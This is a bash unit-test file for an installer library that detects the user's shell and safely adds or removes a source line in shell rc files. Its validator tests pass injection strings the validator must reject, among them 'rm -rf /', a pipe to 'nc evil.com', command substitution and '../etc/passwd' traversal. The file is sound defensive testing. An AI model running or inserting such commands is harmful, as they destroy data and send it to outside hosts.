#!/usr/bin/env bash
# test-shell-detect.sh — Unit tests for shell-detect.sh
# Tests shell detection, source line validation, add/remove idempotency

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LIB_DIR="$(cd "$SCRIPT_DIR/../../lib" && pwd)"

source "$LIB_DIR/shell-detect.sh"

PASS=0
FAIL=0

assert_eq() {
    local desc="$1" expected="$2" actual="$3"
    if [[ "$expected" == "$actual" ]]; then
        PASS=$((PASS + 1))
    else
        echo "  FAIL: $desc — expected='$expected', actual='$actual'" >&2
        FAIL=$((FAIL + 1))
    fi
}

assert_exit_code() {
    local desc="$1" expected="$2"
    shift 2
    local code=0
    "$@" 2>/dev/null || code=$?
    if [[ "$expected" == "$code" ]]; then
        PASS=$((PASS + 1))
    else
        echo "  FAIL: $desc — expected exit $expected, got $code" >&2
        FAIL=$((FAIL + 1))
    fi
}

assert_contains() {
    local desc="$1" needle="$2" haystack="$3"
    if [[ "$haystack" == *"$needle"* ]]; then
        PASS=$((PASS + 1))
    else
        echo "  FAIL: $desc — '$needle' not found" >&2
        FAIL=$((FAIL + 1))
    fi
}

echo "  Testing detect_shell..."
shell=$(detect_shell)
# Should return bash or zsh
case "$shell" in
    bash|zsh) PASS=$((PASS + 1)) ;;
    *) echo "  FAIL: detect_shell returned '$shell'" >&2; FAIL=$((FAIL + 1)) ;;
esac

echo "  Testing get_shell_config_file..."
config=$(get_shell_config_file "zsh")
assert_eq "zsh config" "${HOME}/.zshrc" "$config"

echo "  Testing validate_source_line..."
assert_exit_code "safe path" 0 validate_source_line '/home/user/.local/share/memoria/shell-init.sh'
assert_exit_code "safe path spaces" 0 validate_source_line '/home/user/my dir/shell-init.sh'
assert_exit_code "block semicolons" 1 validate_source_line '/path/to/file; rm -rf /'
assert_exit_code "block pipes" 1 validate_source_line '/path/to/file | nc evil.com'
assert_exit_code "block backticks" 1 validate_source_line '/path/`evil`/file'
assert_exit_code "block cmd subst" 1 validate_source_line '/path/$(evil)/file'
assert_exit_code "block &&" 1 validate_source_line '/path && rm -rf /'
assert_exit_code "block ||" 1 validate_source_line '/path || evil'
assert_exit_code "block traversal" 1 validate_source_line '/path/../etc/passwd'

echo "  Testing add_source_line..."
tmp_rc=$(mktemp)
echo "# existing config" > "$tmp_rc"

add_source_line "$tmp_rc" "/path/to/shell-init.sh"
content=$(cat "$tmp_rc")
assert_contains "source line added" "Added by memoria installer" "$content"
assert_contains "source path" "shell-init.sh" "$content"

# Test idempotency — adding again should not duplicate
add_source_line "$tmp_rc" "/path/to/shell-init.sh"
count=$(grep -c "Added by memoria installer" "$tmp_rc" || true)
assert_eq "idempotent add" "1" "$count"

echo "  Testing remove_source_line..."
remove_source_line "$tmp_rc"
count=$(grep -c "Added by memoria installer" "$tmp_rc" || true)
assert_eq "line removed" "0" "$count"

# Verify existing content preserved
assert_contains "existing preserved" "existing config" "$(cat "$tmp_rc")"

# Test remove on missing file
assert_exit_code "remove missing file" 0 remove_source_line "/nonexistent/path"

rm -f "$tmp_rc"

# Test add to non-existent file
tmp_new=$(mktemp -u)
add_source_line "$tmp_new" "/path/to/shell-init.sh"
assert_eq "created new file" "0" "$?"
count=$(grep -c "Added by memoria installer" "$tmp_new" || true)
assert_eq "line in new file" "1" "$count"
rm -f "$tmp_new"

# Summary
echo "  Results: $((PASS + FAIL)) tests, $PASS passed, $FAIL failed"
[[ "$FAIL" -eq 0 ]]
